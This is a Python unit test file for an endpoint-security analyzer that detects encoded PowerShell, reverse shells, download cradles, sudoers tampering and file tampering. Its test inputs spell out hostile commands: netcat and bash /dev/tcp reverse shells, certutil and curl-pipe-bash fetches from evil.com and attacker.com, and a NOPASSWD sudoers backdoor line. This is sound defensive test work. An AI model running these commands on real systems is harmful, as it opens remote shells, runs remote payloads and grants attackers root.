"""Unit tests for Endpoint Security Capability Module (X3).

Tests LOLBAS detection, reverse shells, privilege escalation,
FIM baseline hashing & tampering detection, Auditd & Sysmon log parsing,
and FindingContract compliance.
"""

from __future__ import annotations

import json
from pathlib import Path
from uuid import UUID

from contracts.python.models import FindingContract, SeverityLevel
from modules.endpoint_security.analyzer import EndpointSecurityAnalyzer


def test_benign_commands() -> None:
    """Verifies benign everyday commands do not trigger false positive findings."""
    analyzer = EndpointSecurityAnalyzer()
    assert analyzer.analyze_command_line("ls -la /var/log", host="srv1") is None
    assert analyzer.analyze_command_line("git commit -m 'Initial commit'", host="srv1") is None
    assert analyzer.analyze_command_line("python main.py --config config.yaml", host="srv1") is None


def test_powershell_encoded_command() -> None:
    """Verifies encoded PowerShell execution triggers T1059.001."""
    analyzer = EndpointSecurityAnalyzer()
    cmd = "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    finding = analyzer.analyze_command_line(cmd, host="win-endpoint-01", user="alice")

    assert finding is not None
    assert isinstance(finding, FindingContract)
    assert isinstance(finding.finding_id, UUID)
    assert finding.rule_id == "RULE-EDR-PS-001"
    assert finding.severity == SeverityLevel.HIGH
    assert finding.mitre_attack_id == "T1059.001"
    assert finding.target == "win-endpoint-01"
    assert isinstance(finding.evidence, dict)
    assert finding.evidence["user"] == "alice"


def test_reverse_shell_detection() -> None:
    """Verifies netcat and bash tcp socket reverse shells trigger T1059.004."""
    analyzer = EndpointSecurityAnalyzer()

    # Netcat reverse shell
    f_nc = analyzer.analyze_command_line("nc -e /bin/bash 10.0.0.5 4444", host="db-01")
    assert f_nc is not None
    assert f_nc.rule_id == "RULE-EDR-REV-001"
    assert f_nc.severity == SeverityLevel.CRITICAL
    assert f_nc.mitre_attack_id == "T1059.004"

    # Bash /dev/tcp redirect
    f_bash = analyzer.analyze_command_line("bash -i >&/dev/tcp/10.0.0.5/9001 0>&1", host="db-01")
    assert f_bash is not None
    assert f_bash.rule_id == "RULE-EDR-REV-001"
    assert f_bash.severity == SeverityLevel.CRITICAL


def test_download_cradle_detection() -> None:
    """Verifies certutil and curl pipe bash download cradles trigger T1105."""
    analyzer = EndpointSecurityAnalyzer()

    cmd_cert = "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe"
    f_cert = analyzer.analyze_command_line(cmd_cert, host="win-srv02")
    assert f_cert is not None
    assert f_cert.rule_id == "RULE-EDR-CRADLE-001"
    assert f_cert.mitre_attack_id == "T1105"

    cmd_curl = "curl -s http://attacker.com/rev.sh | bash"
    f_curl = analyzer.analyze_command_line(cmd_curl, host="linux-srv01")
    assert f_curl is not None
    assert f_curl.rule_id == "RULE-EDR-CRADLE-001"


def test_privilege_escalation_tampering() -> None:
    """Verifies shadow and sudoers tampering triggers T1548.003."""
    analyzer = EndpointSecurityAnalyzer()

    cmd_sudo = "echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
    f_sudo = analyzer.analyze_command_line(cmd_sudo, host="srv-app")
    assert f_sudo is not None
    assert f_sudo.rule_id == "RULE-EDR-PRIV-001"
    assert f_sudo.severity == SeverityLevel.CRITICAL
    assert f_sudo.mitre_attack_id == "T1548.003"


def test_fim_baseline_and_tampering(tmp_path: Path) -> None:
    """Verifies FIM baseline tracking, modifications, deletions, and snapshot persistence."""
    test_file = tmp_path / "sensitive.conf"
    test_file.write_text("initial_state_123", encoding="utf-8")

    analyzer = EndpointSecurityAnalyzer()
    indexed = analyzer.initialize_fim_baseline([test_file])
    assert indexed == 1

    # Clean state
    assert len(analyzer.check_file_integrity(host="prod-node")) == 0

    # Modify file
    test_file.write_text("tampered_content_456", encoding="utf-8")
    mod_findings = analyzer.check_file_integrity(host="prod-node")
    assert len(mod_findings) == 1
    assert mod_findings[0].rule_id == "RULE-EDR-FIM-001"
    assert mod_findings[0].severity == SeverityLevel.CRITICAL
    assert mod_findings[0].mitre_attack_id == "T1565.001"

    # Export & import snapshot
    snapshot_path = tmp_path / "baseline.json"
    analyzer.export_baseline_snapshot(snapshot_path)
    assert snapshot_path.exists()

    new_analyzer = EndpointSecurityAnalyzer()
    loaded_count = new_analyzer.import_baseline_snapshot(snapshot_path)
    assert loaded_count == 1

    # Delete file
    test_file.unlink()
    del_findings = new_analyzer.check_file_integrity(host="prod-node")
    assert len(del_findings) == 1
    assert del_findings[0].rule_id == "RULE-EDR-FIM-002"
    assert del_findings[0].severity == SeverityLevel.HIGH


def test_log_parsers() -> None:
    """Verifies Auditd and Sysmon record parsing into FindingContract."""
    analyzer = EndpointSecurityAnalyzer()

    # 1. Auditd EXECVE log line
    auditd_line = (
        'type=EXECVE msg=audit(1700000000.100:123): argc=3 a0="nc" a1="-e" a2="/bin/sh" pid=4512 uid=1000'
    )
    f_audit = analyzer.parse_auditd_line(auditd_line, host="linux-box")
    assert f_audit is not None
    assert f_audit.rule_id == "RULE-EDR-REV-001"
    assert f_audit.target == "linux-box"

    # 2. Sysmon JSON event
    sysmon_line = json.dumps({
        "EventID": 1,
        "Computer": "CORP-W10-09",
        "EventData": {
            "CommandLine": "powershell.exe -EncodedCommand QQB1AHQAbwBtAGEAdABpAG8AbgA=",
            "User": "CORP\\jsmith",
            "ProcessId": 8812,
        },
    })
    f_sysmon = analyzer.parse_log_line(sysmon_line)
    assert f_sysmon is not None
    assert f_sysmon.rule_id == "RULE-EDR-PS-001"
    assert f_sysmon.target == "CORP-W10-09"
